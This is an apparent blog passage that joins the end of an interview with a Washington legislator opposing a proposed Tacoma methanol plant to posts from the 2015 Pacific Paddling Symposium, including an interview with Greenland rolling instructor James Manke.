legislature.\nSo I tried to find out information about the hearing. I went so far as to go to the website for the Port of Tacoma. I did find reference to a meeting taking place. It told me what the agenda was going to be and included this discussion with the Northwest Innovations Works, LLC. It didnt tell me the place and didnt tell me the time. And that was my first inkling that this was not an issue that the proponents wanted to have known in the community. I was not deterred by that. I had my staff call their office and find out when the meeting was taking place and where, and to inform them that they didnt have the information on their website.\nI rushed over because it happened to be that afternoon. I arrived there at the very end of a queue of people lining up into a rather small room, the conference room for the Port of Tacoma. I arrived at the meeting and signed in to testify. In the legislature we are used to having hearings on bills and there are some controversial subjects where we might have hundreds and hundreds of people signed up to testify, or at least signing in with either a \"pro\" or a \"con\", so I was surprised after almost being late for the meeting that i was actually only number 17 to sign up. I had no idea what I would actually say, because I didnt know anything about the project, nor who any of the players were, but I sat down in this somewhat small room.\nEvery wall with the room was lined with members of unions who were dressed in their hazard clothesbright oranges, bright yellows, bright greensand I knew then who at least one of the players was that had an interest in this proposed leasing of the old Kaiser plant site in the Port of Tacoma to this LLC.\nSo I listened to the testimony. It started with 4 or 5 representatives of Northwest Innovation Works, and then there were many representatives from labor unions talking about the construction jobs, and then the jobs that would be for permanent employees that would manage the plant after it went live.\nI was bringing up the rear after only a couple of my constituents from Northeast Tacoma spoke, two couples. Their testimony basically was exactly what they told me on the phone. They live in an area very close to where the plant would be established. They drive bythere is one access road up to Northeast Tacoma, and its very, very close to where the plant is located. They were very concerned about any potential leakage into the Hylebos waterway. They were concerned about air contamination. And they were mostly concerned about what the plans were in case there is a catastrophic event.\nWhen I actually got up to speak I began with this sentence: I believe this is a project that everyone would love to love. Weve heard that it provides good jobs. Weve heard that it would positively impact the environmentthe global warming that we are becoming so much, unfortunately, accustomed to. But there are significant gaps in information. You have done nothing, as far as I can see, to reach out to elected officials. Youve done nothing to reach out to neighborhoods that would be impacted if such a catastrophic event were to take place. And I cant see how this can move forward until education, dialogue, and advancement of transparency well above what youve demonstrated thus far, were to take place.\nAnd then the hearing concluded with the four members that were present at the commission meeting voting unanimously to award a 30-year lease to the LLC, this after several of us had made the plea to just wait. What was the urgency of voting on this at that meeting? Well, quite frankly, the urgency was they wanted to do it ahead of any public dialogue, ahead of any transparency and ahead of any kind of education to the community.\nSo I left there feeling concerned but also recognizing how little I knew about the issue. I needed to self-educate. I needed to reach out and find more information about this whole issue. How do we get liquified natural gas (LNG) into our county? What is this process of transference? And what is ahead for us in terms of the educational process that needs to take place?\nOne of the challenges in being a legislator is you have to recognize that sometimes a little bit of information makes you dangerous. I didnt want to come off as being dangerous after a short amount of time. So I took quite a while talking with people.\nI had the opportunity to meet with a person who just moved to Tacoma who worked in the LNG field for 30 years and had retired here in Tacoma. I had the opportunity to learn about some of the real catastrophic events that can happen at sea (he was a ships captain also as part of his work), coming into ports, and going through narrow waterways. I heard words of caution from him about whether or not a plant like this had any place at all in an urban center. I was piqued by that and did research into how communities had addressed this issue.\nOf course, there is very little to know about communities that have worked on this because its new. Fewer than 10 years ago the United States was an importing nation. We imported liquid natural gas. It was only through the inauguration of fracking that we found reserves that not only were sufficient, or had been deemed to be sufficient, for our own domestic use, but are very marketable, and we became and exporting nation.\nThere is lots of controversy obviously about fracking. One of the things I learned about fracking is that it takes requires a very small sand, a very dense sand, thats used in the actual fracking process to push the gas out towards an area where it can be drained and put in a reservoir. That small sand only comes from 3 areas of the world: two of those mines are in China and one is in Kuwait.\nSo then I started thinking, lets follow the bouncing ball here. Who takes the risk? Who pays for it? And what is involved in this whole process of fracking? You follow the sand into the country. It goes to the central part of our countryOklahoma, Tennessee, wherever they are frackingand its used there in the process of bringing that liquified natural gas to the surface, at great cost potentially to the environment in each of those states. Earthquakes in Oklahomanot a normal occurrence! So then where does it go? Then we ship it through pipelines and it comes to a town like Tacoma.\nThere are many pipelines across the country. Weve had pipelines moving gas and moving liquified natural gas through our community for years and years and years. Most people dont know that we have a refinery on the Tideflats right now that for over 50 years has pumped gasjet fuelout to McChord Air Force Base, across the east side of Tacoma through neighborhoods, along a railway track for 50 years. There is a constant process of making sure that that pipeline is not leaking. Part of it is above ground. Part of it is below ground. That same thing is happening across our country with pipelines now. There is great cost to the maintenance of the pipelines so that they dont cause a catastrophe.\nThen you look at where this natural gas is coming from, and what the process for transforming it to methanol and shipping it to China. The proponents of this plant and this relationship with the Chinese government say that this is an incredible opportunity for the citizens of Tacoma and Pierce County, that it is a $3.4 billion private investment in our community. I have no problemno problemconfronting that piece of this argument. This is not private money. China owns the American debt. This is a situation where we are buying a product from China, bringing it here, fracking our country, taking the gas out, bringing it here, changing it into a product that they want, and shipping it back to them. To their complete profit, and to our complete risk.\nSo now we are going to look at how do we label that? What does that process look like to you? I am enough of a historian to know that it looks an awful like the British Commonwealth to me. Took over the worlda large part of the worldused local labor at a very low cost for a product that had great import to the British Commonwealth. And whether that was minerals or diamonds or you name it, they took it from those countries without their consent. We are sitting here consentingconsentingto this process in our country.\nRICHARD: Enough that we get 200 jobs.\nJEANNIE: Two hundred sixty jobs lets be precise. I have been a long supporter of labor causes, but I dont understand how we look at the level of risk that is associated with this project, how we look a the level of water needed alone to actually do the transformation between liquified natural gas to methanol, and think that 260 jobs is worth that.\nThis plant is located very close to the city of Fife. Fife is a really interesting city. It sits and is divided by Interstate 5, but there are only 5,000 people that live in the city of Fife, and over 50,000 people come there to work every day. Five thousand people live there and 50,000 come to work there. And its an around the clock 24/7 kind of community through warehousing, manufacturing, casinos, gas stations, restaurantsyou name it. Its a small town, but it doesnt feel like a small town.\nThis community had not been talked to by the LLC at all. There was no one from the city of Fife at that hearing May 1st, 2014. I raised the issue with members of the City Council of Fife one after the other, and none had heard of the project. Yet the Port of Tacoma commissioners had already granted a 30-year lease to this company.\nYou know we just had a large public hearing [the January 21st Enviromental Impact Statement Scoping Meeting in Tacoma] the about what the elements of the Environmental Impact Statement (EIS) would be. I was in Olympia. The session was already going on, but I was able to leave a committee hearing and barrel up the freeway to get here. It was supposed to start at 6:30 PM. It started at 5:30 because they opened the doors at 5:00 and the rooms were completely full at 5:30 and they felt that they needed to move ahead.\nSo when I arrived at 6:00 I was told there was no room at the innnot in the main room (500 seats), and not in the anteroom, which had 200-300 seats, and there were about 200 of us outside waiting for people to leave the hearing after they had spoken so that we could get in. So I got in about 6:35. I didnt have the opportunity to hear the LLC give their presentation but by that time they had gone through the process of a pro speaker and a con speaker, a pro speaker and a con speaker. By 6:30 all they had left to hear from was the con speakers. While there was an occasional positive speaker in there, I was there until 10:30 and all that rest of that time there was people expressing concerns.\nI went back to the legislature the next day and I asked my colleagues, Have you ever had 1,000 of your constituents show up at one place? One place? No. No one had ever had this experience.\nI was so struck that night by the presentations by people from my district, the people who had lived in this community for 3 and 4 generations, and the people that were brand new to this community who moved here because of the hope and the promise that community gave to themthe affordability, the friendliness, the fact that it had had a lousy reputation in the past, and it had a better reputation today. I listened to the people that had participated in building our downtown, not the structures that are there, but the ones that were empty in the 1980s and are full again now because of the the investments that government made and the local community made in rebuilding, reenergizing, and reinvesting in this promise that is Tacoma. From the University of Washington Tacoma, the reboot of our Federal Building, the light railI mean I could go on and on about the ways I love my city. And all of that is threatened by this plant. This one thing.\nThe young people that spoke, the older people that spoke, the Native Americans that spoke all pointed to that one stark reality, which is that we have everything going for us in this community. We have a vibrant museum district. We have a vibrant Port of Tacoma. We have invested in cleaning up waterways, and really making our city strong. And for this plant to undo the progress that has been made in Tacoma, Washington, or even to threaten to do that, should move any policymaker who is still on the fence about whether or not to support this project.\nI had already made my decision before I went in that room. The Port Commissioners had asked me not to speak against the project. They wanted me to waitas they did all of the policy makers in Pierce Countywanted us to wait until all the facts were out. And yet I havent received any new facts from their side of the argument since they promised to give new facts to us. The die was cast for me. But I was just so amazedthe eloquence of my constituents was the frosting on that for me.\nI will tell you that I am petty much alone right now in terms of actively voicing, and advocating to my constituents that they need to know more about this project, and they need to mobilize.\nI have talked to my colleagues in other districts in the state who have undertaken big projects like this before, trying to stop negative programs from coming into their districts. I spoke with Senator Sharon Nelson who is our minority leader in the Senate Democratic Caucus. She lives on Vashon island. She certainly knows a lot about ASARCO and the horrible effects on her community right across the waterway from where the ASARCO plant had existed, and which now quite frankly is a lovely and evolving, amazing walkable community with lots of amenities which once was a slag heap and a disaster zone. I talked with senator Christine Rolfes from Kitap county where the NASCAR industry had decided they wanted to put up a new NASCAR race track in a rural part of Kitsap county. Her project with trying to rebut that offer took a couple, three years. Senator Nelsons attempts to end a quarry upsetting the environmental and ecological balance on Maury Island took 9 years.\nSo I think we are in this for the long haul. I dont think this is going to be a one or two year project for us, to say No and mean it, and to be successful in bringing more people to our side and more policymakers to our side, and for the general public to become more aware of this project. Its certainly going to be an issue that divides our community. I dont want that to happen, but I think its got the kind of magnitude that we are going to see sharp differences from one side to another.\nRICHARD: Do you think it will impact on electoral politics?\nJEANNIE: Yes, I absolutely do think it could impact on electoral politics.\nRICHARD: Specifically where?\nJEANNIE: This project is in the 27th district now, whether the public health threats reach outside the 27th districtcertainly they doFife now, for instance. Right at the border where the plant will be located is in the 25th district. So far, no legislators have come to any meetings nor have they shown much interest in this topic from the 25th district.\nBut our two representatives from here in the 27th district have met with me and others. Theyve been working with me to write a very long letter to the EIS process so that we could have questions that have been asked of us and make sure those questions are answered in the EIS. I think we are moving together as a delegation on this to some degree. Im not going to speak for my colleagues until they want to be spoken for, but were not in full accord yet, and we certainly have not had a discussion about next steps in terms of how this will proceed for our role in it.\nIt could play in electoral politics, certainly. Any of us could have candidate run against us this year from the other side of the topic. And I would venture to say I will lose labor support in my re-election bid. But if I were to look just to Facebook and see now literally scores of people from this movementscores of constituents I didnt know but who saw me at the hearing, who have seen what I had written on Facebook, who heard me talk about this issue who are trying to friend me and keep up with where I am on this issue, I would say this is a movement that will have its roots and its success in social media.\nThis is not something that many campaigns have had to grapple with, quite frankly. Its a whole new world with social media now, and the tweets and the Facebook posts are going to rule in this educational process. We already see how innovations in social media have influenced and energized and mobilized groups around other topics, including race relations and even responding to the weather and threats of the weather. We can see it working to the good, and I think it will be an excellent tool that will be used to educate the community about the threats of this plant going in.\nRICHARD: What Ive heard you say is so many times it was a question of getting the word out. It is to the methanol plant proponents not to get the word out generally, and it is to those who are opposing it to get the word out generally. What do you foresee is the best way to get the word out as generally as possible?\nJEANNIE: I think that its a continuation of things that have already been done. Id love to teach an Advocacy 101 class to folks who are just new into this whole field, in trying to mobilize and trying to make a force for good. I think there is a great threat that they will do some things wrong that will negatively impact what they are trying to achieve. So Id like to caution people that this is a process. We wont fix it in a day. Be calm. Use some good strategy to move forward, but be persistent in messaging.\nYears ago our Caucus in Olympia had hired a consultant to try to figure out what was the message the Democrats wanted to portray. He came to do a strategy session with us and said, Well I looked at last years messaging, and the Republican party had three messages, and the Democratic party had 83 messages.\nSo its very important for us to know what we want to say, and to repeat that over and over and over again, whether it is spinning an argument, or pivoting it to that message over and again. It wasnt overnight that people learned that two-all-beef-patties-special-sauce-lettuce-cheese-pickles-onions-on-a-sesame-seed-bun was a Big Mac! It wont be overnight that people learn that this is a project that has potential threats to our community, our air, our water. It has a blast zone that has been drawn to me. The room we are in now is within this blast zone. And that it could take out portions of Marine View Drive which is the one access road into Northeast Tacoma. It could take out Route 509, which was built to provide a parallel road to Interstate 5 so that the locals could move around and let the other folks fight for space on I-5. It could take out portions of I-5 where the state is now going to be investing over a billion dollars in a transportation project to finish Route 167, which will be coming in and hooking into the Port of Tacoma for the transportation of good and services in and out of the Port to improve our economic development. Its going to have the impact of potentially (and certainly within the blast zone as well) to take out a prison, a federal prison that exists on the Tideflats where 1,500 persons are being detained right now. I cant imagine what kind of exit plan would be sufficient to continue to have public safety and to provide for personal safety for those 1,500 people, and the hundreds of people that are working at that detention center.\nYou know, there is a reason why the City of Tacoma has never granted permits to build condos on the other side of the 11th Street bridge. A big reason. They havent done it is because it is fill dirt. If you were to look at early photographs of Tacoma, you will see the point just below where we are right now, where Thea Foss used to get in her little boat and began to ferry people across where its now Northeast Tacoma. There were no fingers of land that went out along waterways where industry has been planted over these years.\nAs you know we have fault lines through this area. We have learned from the New York Times that the Big One is coming (of course, weve always known that) Weve seen what a lahar could look like coming down from Mt. Rainier. We know that the Puyallup River, which comes right behind us here, is the passageway for a lahar coming off the mountain. And we know that this kind of fill in an earthquake can simply turn to dust.\nWeve always lived with threats. We have other refineries on the Tideflats, but weve never had people living there for a reason. Its not safe. And yet a former city council passed a resolution accepting an offer from the federal government to place a detention center in that same property where people from Tacoma cannot live.\nThere are all kinds of deals that happen like that over the years that only later are the people of Tacoma made aware. We have the opportunity because we are aware now before the plant is built, before the plant is operational, before the first drop of liquified natural gas makes its way into the plant and gets blasted with 11 million gallons of water a day, and before the first ship leaves into our Commencement Bay, once one of the biggest EPA Superfund sites. We have cleaned it up to a large degree. We have cleaned up the Foss Waterway. We have cleaned up the Kaiser plant upon which this plant will be located if its implemented.\nI asked a question last week of our staff in Olympia when we were having a presentation by the Department of Ecology. I asked if any of the cleanup dollars, the millions and millions and millions of dollars that have come out of taxpayers pockets that we have used for cleaning up toxic sites, Have we ever cleaned up the same site twice? And the answer of course was No. And then there was the, Why? Are we building something toxic on one of the sites weve cleaned up? And I had to answer Yes.\nThere is so much more that I could talk about. Ive not really talked about the threats to children and the threats to other investments that weve made in the waterway. But I would say I feel very optimistic about the people of Tacoma and Pierce County, and even our neighbors just over the hill in South King County, just to our left on Maury Island and Vashon Island, to rise up with us and have our voices known in this effort.\nIve talked with the Governor twice about this. Ive talked with the Governors staff twice for about an hour about this project. I believe Ive opened the Governors eyes to something he initially supported, which was a jobs and environmentally friendly product.\nThe goal of the Chinese government is to take the methanol that they will receive from this project, and convert a coal-burning plant that makes olefins (plastics) and convert that to a methanol-burning plant. Much fewer emissions, much better for their air quality in China and overall a good thing, were we able to have access to clean fuel at the place where we are currently using dirty fuel. In this case though, we are asking the United States to take all the risks to provide that clean fuel to this area of China. Unfortunately, they dont have the materials to do that themselves domestically. But I dont think Tacoma, Washington is the location. And I think that the people of Tacoma will make that loud and clear.\nRICHARD: Given that this plant is going to demand just about as much gas electricity and potable water as the entire rest of Tacoma, couldnt his mean that utility rates could go up on all of those things for everybody living in Tacoma?\nJEANNIE: It is absolutely true, and no doubt that they will have increased utilization of utilities that currently come in to Tacoma. The rates are established based on the old supply and demand kind of analysis. We have got the supply of water we need to create electricity through turbines that are located outside of Tacoma but in our watershed, which includes Lake Cushman, Lake Alder, the Green River. We operate on hydrothats the major source for electricity for this whole basin. If we were to have a user come in to our mix that is going to double the utilization of that water. Double. Weve got well over a million people that live in this catchment area. One plant is going to double utilization. There is no way that thats not going to increase our rates. We dont have sufficient water, freshwater, in the watershed for our current needs. Everyone knows that last summer we were asked to reduce our consumption by 10%. That was voluntary. What happens if we face another hot summer, another year of drought? Well during the course of the life of this plant30, 40, 50 yearswe are going to face many years of drought. There is no question in my mind. The citizens of Tacoma will have to ask our utilities to go elsewhere, since the water table will not be sufficient for that kind of utilization. We will have to purchase that energy from another area. We currently have one of the cheapest formshydrobut what if we have to purchase something that is more expensive? Yes, our rates could go up.\nDo you know that every Friday afternoon there are families lined up today at our utility office asking for, petitioning for keeping their lights on over the weekend, keeping their heat on over the weekend, while they try to muster enough money to pay their bill?\nWe have a community that is facing economic challenges. Its not unlike in many ways the communities elsewhere in the country that have been the locations of these kind of plants. We know that this particular company wants to build another plant in southwest Washington on the Columbia River in a community that has been hard pressed by economic disadvantageKalama.\nWe dont have to look too far for the other plant in their 3-plant proposal, which is in Louisiana, along an area that is called Cancer Alley because of the types of plants that have been built there over the years, which is a largely a community of economically disadvantaged individuals living there.\nIf this bad air quality drifts as the wind is blowing right now to our east side of Tacoma, it blows into our most economically disadvantaged portion of our county.\nSo there are issues around rates. We have issues around economic security. We have issues around public education and the transparency of this whole project that have created enough concern for me that I have actually proposed legislation that really hasIll say right up fronthas little chance of being passed. I dropped a bill as soon as I could after I realized that I could actually request that a particular tax be applied to this project.\nThey, under current structures right now, could quality for a sales tax abatement. In other words they wont pay sales tax on any kind of manufacturing that they do, any kind of building that they do. This has been largely an economic development tool that the state has used to try to attract companies into coming into Washington. But in this case it could obviously backfire for us. It has brought into our midst not one, but two plants proposed in Washington state by this particular LLC.\nSo I proposed that the tax abatement not apply to projects relating to liquified natural gas being converted into methanol. That bill was referred to the Trade and Economic Development Committee. I thought because it was a tax bill that it would be referred to the Ways and Means Committee which I serve on, but instead it is going to a committee that has already completed its work for the session. It was a direct decision on the part of the Republicans handling which committee things go to, to not place it in a committee that was still doing its work.\nThat is a disappointment. But I have raised the interest and the awareness of my colleagues in this fight. And because I know that this will not be taken care of in this year, I presume I will come back next year with something earlier in the session with a greater potential to be passed, and we will see where that takes us.\nThere is also a bill currently being considered that is a streamlining bill, meaning that, for what they call projects of state significance (certainly a project of $3.4 billion project has state significance) the bill would take away their requirement to actually receive permits or even have to apply for permits for the plant. I have worked with Republicans on an amendment to their bill. They are going to be accepting the amendment if all works out well this next week and the bill will pass. It is a bill I voted against obviously in the past, and I will probably still vote against it even though Ive got it amended. It will hopefully go to its death over in the House. Again, what we do with these kinds of things, whether its dropping a bill or getting an amendment on a bill, in some ways we are trying to make the pig look better  you know, putting a bow on the pig. But were going to be able to count on the House to not pass that bill which they have rejected in the past, so we wont see industries of all types getting out of doing permitting processes that we are relying on right now as we look ahead to how this plant will be implemented. There are shoreline permits. There are air permits. I mean there are all kinds of things ahead of them.\nRICHARD: I think they devoted 3 years for the permitting.\nJEANNIE: Just to the permitting. Ive got time as well if Im re-elected to go back to Olympia and continue to try to figure out what a state role would be, in trying to put sideboards around this project, to eliminate the project, to make so many headaches for the project that it doesnt pencil out. Whatever I can do.\nJF Marleau: Surf's Up in Pedder Bay?\nJF Marleau: Surf's Up in Pedder Bay?! from Andrew Elizaga on Vimeo.\nSea kayaking instructor and guide JF Marleau talks about teaching surfing and demonstrates stern rudder and carving on waves in Pedder Bay at the 2015 Pacific Paddling Symposium. JF is a resident of Ucluelet, BC, and is the author of \"Kayaking the Broken Group Islands. The Essential Guidebook\".\nGinni Callahan: An Introduction to Kayak Sailing\nGinni Callahan: An Introduction to Kayak Sailing from Andrew Elizaga on Vimeo.\nKayak coach, entrepreneur, and writer Ginni Callahan founded and co-owns Columbia River Kayaking, and Sea Kayak Baja Mexico. With Mark Whitaker, she imports Flat Earth Kayak Sails and Sea Kayaking UK (Nigel Dennis Kayaks). With Anna Mallin, she publishes paddling guides to the Loreto National Marine Park. Filmed at the 2015 Pacific Paddling Symposium\nPosted at 09:41 AM in 2015, Pacific Paddling Symposium | Permalink\nJames Manke: This one weird trick will improve your Greenland rolls!\nJames Manke: This one weird trick will improve your Greenland rolls! from Andrew Elizaga on Vimeo.\nGreenland-style paddling instructor James Manke is the founder of the website All Things Qajaq. He teaches at sea kayaking symposiums and events throughout the world, and along with paddler James Roberts, represented Canada to compete in the 2014 National Greenland Kayaking Championships. James Manke won gold in the Greenland rolling competition and 5 silver medals in other traditional kayaking disciplines. He is an active member of West Coast Canadian ocean kayaking group, The Hurricane Riders. We interviewed James at the 2015 Pacific Paddling Symposium.\nPaddling out of Pedder Bay, Vancouver Island. Photo  Katya Palladina\nAndrew: What was going on today at PPS?\nJames: Today was Coaches Day. It was all about getting out there, sharing with and inspiring fellow instructors, which I found very rewarding. One of the things I found very interesting was all the different games that some of these coaches are utilizing and playing. Theyre quite clever, actually. Some of the other things that I picked up, and one of the things I do often in rolling, is that I talk a lot about a load-drive concept. When we implemented that into strokes and all the different techniques that are out there, it was amazing to find out that the load-drive concept is actually used though all the skill sets in kayaking, along with other sports. Its very valuable to have a Coaches Day like this at the beginning of a symposium, simply because you can bounce ideas off other instructors. Its just really rewarding as an instructor to have that as an experience.\nAndrew: What will you be teaching this weekend?\nJames: Ill be focusing on teaching Greenland rolling, primarily in the pool, and a lot of beginner rolling, some intermediate, and a little bit of advanced. Then on Sunday Ill be teaching out in the actual currents, out in Race Rocks. Were going to be doing a Greenland rolling clinic out in the currents, which is the next step after learning your roll. Its kind of exciting because its the first time thats happened here at PPS, so Im pretty excited about that on Sunday.\nAndrew: So how did you first get into Greenland rolling?\nJames: Interestingly enough, I got into Greenland rolling from a fear of the water. I was afraid of the water, and it all started when I was a young child. I actually got attacked by a loon when I was 11 years old. I was in a belly boat, and I was kicking backwards, coming around this pier and fly fishing. I kicked into a loons nest, and that was a big mistake. It was either the mother or the father, and it swarmed me, and came at me, then it decided to go under the water and it attacked me that way. It became quite an experience! I got out of the water, and never went in to the water until my late 20s, and when I did it was pools primarily. I wouldnt step foot in a lake, because there are loons in a lake. And the ocean? Heck, no! I mean, if there are loons in a lake, whats in the ocean, right? There was no chance of me even going in the ocean. I was quite terrified of the water.\nWhen I picked up kayaking and discovered rolling I thought, Hey, this could be a great way for me to overcome that fear of the water. So I picked up on that, and it did help. It started to help me overcome that fear. I discovered that the more that I understood it and that the more rolls I learned, the more confident I became. I went from being completely afraid of the water to, all of a sudden, now Im playing in the biggest water  paddling Skookumchuck rapids, and that sort of thing. Ive been down the Grand Canyon. It just sort of all exploded from, started from, a fear of the water. Learning to roll really added a whole lot of confidence to my paddling. So thats basically my story and how I started  a little bizarre, but thats where I was.\nAndrew: Can you comment about the difference between standard kayak paddles and Greenland paddles?\nJames: I personally use both paddles. I like Euroblades as much as I do like Greenland blades, and Ill try to be as diverse as I can with both paddles. In the future Id like to grab a wing paddle and start to blend that into the mix. Im not so much a purist when it comes to Greenland paddling. Im more about the blending of the skills. I think that theres a lot of value from traditional kayaking that modern day kayakers can pick up, so thats more what I promote rather than being the purist of Greenland, or being one-sided about a Greenland paddle. I think theres value in all blades, all kayaks. The more kayaks and the more paddles you know how to use, the better paddler you are. Thats the bottom line.\nTraditional wooden paddles, modern gear. Photo  Katya Palladina\nAndrew: About your trip to Greenland with James Roberts to compete in the National Kayaking Championships and to film the movie Greenland Bound  A Paddlers Pilgrimage: how much do you think that experience changed you? James: It definitely changed me. It changed me in a big way. Going into a competition, you really expect a competitive sort of feel. And when we got there it became very obvious that this was more of a celebration. It was more about a culture, and about inspiring young kids so that that cycle continues. It was really an inspirational event. Its not so much about winning so much as it is about being there, and inspiring, and being a part of it. I think more of an American attitude toward something like that is that we are quite competitive. We do a lot of sports and we are competitive by nature. So going to an event like that, I walked in feeling that way, but had to give my head a shake, like, Oh man, Im here for the wrong reasons! I really learned that the reason for being there was about kids, and about inspiring the next generation of paddlers. So there was a big message to learn when I was there.\nThere were some language barriers, for sure. In Greenland they speak Greenlandic. Their second language is Danish. There are a number of people who are Danish who live there, so you can use a Danish person as sort of a translator. But still, its pretty broken language. Someone from Denmark doesnt really understand Greenlandic that well, but can kind of pick apart what it is.\nJames Roberts and I went to the judges booth, and we had a Danish guy with us to translate. We said, When is our long distance race? And from the translation that we got, he said, Oh, youve got lots of time. You can go out for lunch. So we thought, Oh great! Thats awesome! We take off our drysuits and put on all our camera gear, and start hiking up this mountain to go to have lunch. Well, we make it up to the top of the mountain, and its a good 15-20 minute haul to get to the top, and theres nobody there! And were like, No, you gotta be kidding! Theres nobody here! So we sit around and wait. Nobody shows up for lunch. Ok, this is a little bit odd. So we walk all the way back down to the bottom of the mountain. And were like, Yeah we went all the way up there for lunch but theres nobody there. And theyre like, Oh, you missed your race! So we ended up missing a race because of the translation that got lost!\nIt was a little frustrating, but we learned that you cant really rely on the translations. If you want to be a part of this, you just have to stay in that area and just listen for your name. Because I know when they say, JAMES MANKE, CANADA!, I know thats me. But all the other language is very hard to understand.\nThe interesting thing about culture and about different languages is that even if you dont understand what they are saying, you can feel the energy. Its very powerful. We felt that welcomeness. We could tell we were very accepted and welcome. And it took a couple days to warm into that.\nGreenland Bound - A Paddler's Pilgrimage from Ontario Sea Kayak Centre on Vimeo.\nKatya: Whats in your super-duper coach kit, as far as gear? Do you have some secret stuff in your PFD, something that you always bring?\nJames: I do like to hold on to a memento when I go paddling. For a long time its been a necklace of some sort. At one point I had a ring from my grandmother that I used to wear, but recently the memento that Ive been wearing comes from a young guy that I mentored who lives on Salt Spring Island, and he made me a necklace. Thats now what I wear when I travel and teach. I make sure that I always have this necklace on me. He hand made that for me, so its just something thats very special to me. So yeah, I do carry around a little something. I dont have like a toolbox full of things that I might take out, because I am quite a minimalist when I go out paddling. But I do like to have something that I can sort of hang on to.\nAndrew: How did you end up becoming a member of the Hurricane Riders?\nJames: Basically, how I became a Hurricane Rider is that a number of the Hurricane Riders are local to Victoria or Vancouver Island, and they became my peer paddlers. Since I started paddling Ive always looked up to the best paddlers out there. I tried to tag along with them so I can learn from the best. I believe that if you want to become really good at something, youve got to surround yourself with people that are better than you, so thats what I did. I hung around those guys, and eventually I just got brought on as a member. I think part of that was they saw some value in me for the skills and abilities that I have in rolling. And in reverse, they have skills and abilities in rough water that are absolutely incredible that that I can gain from. It was just a good partnership to join the team. Im very happy to be a member and they are absolutely a blast to paddle with. A lot of times when I get out into some of those rougher conditions with other paddlers, theyre very timid and very afraid of the conditions. But when Im out with those guys, its just nothing but fun  pure enjoyment and fun. And inspirational. I mean, we dont just go out there and surf. Its all about, OK, today we are going to do THIS! Its always the next challenge, the next challenge. So thats what I enjoy about the Hurricane Riders in particular. Its a great group of paddlers to paddle with.\nAndrew: What are your choice of kayaks?\nJames: I gotta be really careful what I say here because Im a sponsored paddler, but I like a number of different kayaks. I am sponsored by Tahe Outdoors. One of the kayaks that they made in the past was the Tahe Greenland, and that is probably by far my favorite kayak thats out there now. It is now made by a different manufacturer, but Zegul still has some Greenlands.\nSome of the other kayaks that I really like  and if I was going to say some of the better kayaks that are on the market  are the Sterling Kayaks. Absolutely hands down. The Sterling Reflection is an excellent kayak. Its very good in rough water, and actually rolls really well too. You can get in it a half-inch cut, and a one-inch cut. And they recently came out with the Progression which is meant for smaller paddlers. Its cutting edge. Its very cutting edge. The designer of the kayaks [Sterling Donalson] listens to paddlers, and thats how the kayaks are made. So he takes all the input that he can from the paddlers and puts that into the build, and as a result makes the best products out there. So thats a little plug for Sterling!\nA white Sterling Kayaks \"Grand Illusion\" at PPS. Photo  Katya Palladina\nAndrew: How is the Progression for rolling?\nJames: Actually, the Progression is awesome of rolling. Its really, really good  surprisingly good! When I rolled the Reflection, I was impressed with how its secondary kinda pops and finishes. With the Progression, when you do forward-finish rolls, all you gotta do is get your head up to the surface and the kayak just lifts. Its amazing! Its almost as if it does the roll for you. Its a very odd feeling, actually, where it just has this incredible secondary stability and it pops. I think that has a lot to do with the rocker profile and its volume. As soon as you turn it over it just wants to lift right back up. Yeah, it rolls excellent. Its a really good rolling kayak.\nAndrew: I was wondering about that, because the conventional wisdom is that you need a really low volume kayak to do those Greenland rolls.\nJames: Well, you need a really low volume kayak to do some of the harder layback rolls, for example. Because you are looking to get back onto that back deck. Like a straight jacket roll, for example  good luck doing that in a touring kayak! That is something you gotta do in a very, very low volume kayak. So it really depends on the rolls and what your goals are. When were doing a lot of sea kayaking, the focus really isnt on straight jacket rolls. I dont think anyone is going to go out into the rough, get knocked over and think, Oh, I dont need a paddle, and roll a kayak. We dont really rely on the back deck that much when it comes to that.\nI try to teach more forward finish rolling when it comes to the larger volume kayaks because with some tour kayaks you just cant lie on the back deck all the way. And they become very difficult to do layback rolls in, so I find that, when thats the case, Ill teach the storm roll or some variation of a forward finish roll.\nAndrew: Is teaching sea kayaking a full time job for you?\nJames: Yeah, Im a professional kayaker. I do travel around the world, and I teach, and it's what I do full time. In the winter I supplement myself a little bit with some programming work, being an ex-programmer, just to bring in a little bit of extra income. But other than that, for about 10 months out of the year Im a full-on sea kayak instructor. Its my profession. This will be my third year as a professional instructor. Its extremely rewarding. It definitely doesnt feel like a job. And I would say probably, if it was a job, it would be the best job in the world! Hands down!\nIve been blessed to be able to travel to lots of different spots. Japan I think was probably one of the greatest places Ive been. Just the way they treat you there  like royalty! Its so great! They are so kind and so accepting, and they learn incredibly well, even though there was a language barrier there, and I couldnt speak to a lot of them. It was just a matter of getting in there, and twisting the shoulders, and doing this, and Im almost like twisting Gumby, and theyre rolling! It was like, Wow! These guys are really good! Like they just picked it up really, really quick!\nI think one of the reasons I am good as an instructor is because a lot of the rolls that I learned were all self-taught. I learned how to do it wrong just as well as I learned how to do it right. So if I watch someone do it wrong, I know exactly whats going wrong. And I know exactly how you can fix that problem. Its just a matter of being visual. I can see how someone is rolling and be able to detect incorrect things. I think a lot of that comes from being self-taught. If you are taught how to do it one way, then how do you know how to do it wrong? You dont.\nAndrew: At some point you must have gotten instruction from other coaches, the gurus of Greenland kayaking?\nJames: I did. Actually, at one point I hired Cheri [Perry] and Turner [Wilson] when I was learning to do forward finish hand rolls, because I was struggling with that a little bit. I didnt really get very far with the session, but there were little nuggets of information in there that stuck with me.\nStill, a lot of what I teach now with the hardest rolls, Ive never even seen online. Ive never been taught it, but when you watch some of the Inuit paddlers do the hardest rolls, its pretty obvious  some of the disconnection between the energy in the legs and the upper body, and the load-drive concept. A lot to people are just doing a hip snap to roll a kayak, or they are talking about lifting their leg. But theyre not really talking about what is happening to the other leg.\nAndrew: What exactly is the load-drive concept?\nJames: So the load-drive concept is relevant to a lot of sports. Its relevant to baseball. Its relevant to golf  a lot of sports. Kayaking is another one. We use our legs often, and the load-drive concept is about the legs. If you are loading a kayak, youre going to lift one leg and drop one leg down, and youre putting pressure upward and downward on the kayak. So if this is the load position, than this would be the drive position  it would be the opposite.... When I roll the kayak, Im loading the kayak up. Some of the benefits to loading the kayak is that I can get more power when I drive the kayak.\nOne way that I like to explain that to students is that its like throwing a baseball. If I threw a baseball from my shoulder and I throw it forward, I might get about 10 feet. But if I take that baseball to my shoulder and I load it up, and then I throw it, Ill probably get about 50 feet. So I gain a tremendous amount of power by adding the load-drive concept to it.\nBut it can work against you, just like throwing a baseball. When you first learn to throw a baseball and your dad said, Get it back there and throw it. 